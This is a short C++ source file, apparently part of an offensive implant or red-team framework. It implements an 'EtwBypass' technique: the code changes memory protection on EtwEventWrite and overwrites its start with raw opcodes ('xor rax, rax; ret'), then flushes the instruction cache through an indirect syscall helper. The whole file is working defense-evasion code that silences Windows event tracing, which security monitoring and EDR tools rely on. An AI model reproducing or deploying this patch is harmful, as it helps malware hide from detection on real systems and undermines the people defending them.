#include "core/technique.hpp"

namespace Technique::EtwBypass
{
    // Reference: https://github.com/unkvolism/Fuck-Etw/blob/main/etw-fuck.cpp#L55
    BOOL PatchEtw(Procs::PPROCS pProcs)
    {
        DWORD dwOldProtect = 0;

        if (!pProcs->lpVirtualProtect(
            (PVOID)pProcs->lpEtwEventWrite,
            4096,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            return FALSE;
        }

        #ifdef _WIN64
            memcpy((PVOID)pProcs->lpEtwEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
        #else
            memcpy((PVOID)pProcs->lpEtwEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
        #endif

        if (!pProcs->lpVirtualProtect(
            (PVOID)pProcs->lpEtwEventWrite,
            4096,
            dwOldProtect,
            &dwOldProtect
        )) {
            return FALSE;
        }

        NTSTATUS status = CallSysInvoke(
            &pProcs->sysNtFlushInstructionCache,
            pProcs->lpNtFlushInstructionCache,
            NtCurrentProcess(),
            (PVOID)pProcs->lpEtwEventWrite,
            4096
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        return TRUE;
    }
}
